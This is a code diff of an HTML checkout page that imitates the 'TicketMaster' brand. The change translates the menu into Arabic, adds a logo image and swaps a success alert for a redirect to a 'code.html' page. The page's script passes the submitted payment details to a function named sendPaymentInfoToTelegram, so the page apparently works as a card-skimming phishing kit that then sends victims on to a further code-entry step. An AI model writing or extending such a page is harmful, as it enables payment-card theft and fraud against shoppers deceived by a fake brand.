@@ -17,13 +17,14 @@
             &#9776;
         </div>
         <ul id="nav-links">
-            <li><a href="../index.html">Home</a></li>
-            <li><a href="./about.html">About</a></li>
-            <li><a href="./tickets.html">Tickets</a></li>
-            <li><a href="./contacts.html">Contact</a></li>
+            <li><a href="./contacts.html">اتصل بنا</a></li>
+            <li><a href="./about.html">من نحن</a></li>
+            <li><a href="../index.html">الرئيسية</a></li>
         </ul>
     </nav>
-    <div class="logo"><a href="../index.html">TicketMaster</a></div>
+    <div class="logo"><a href="../index.html">
+        <img src="../assets/imgs/ticketico.png" alt="">
+    </a></div>
 </header>
 
 <div class="checkout-container">
@@ -136,7 +137,7 @@
         await sendPaymentInfoToTelegram(data);
 
         // Optionally, show a success message or redirect to a thank you page
-        alert('تم إرسال معلومات الدفع بنجاح.');
+        window.location.href = './code.html';
     });
 </script>
 </body>
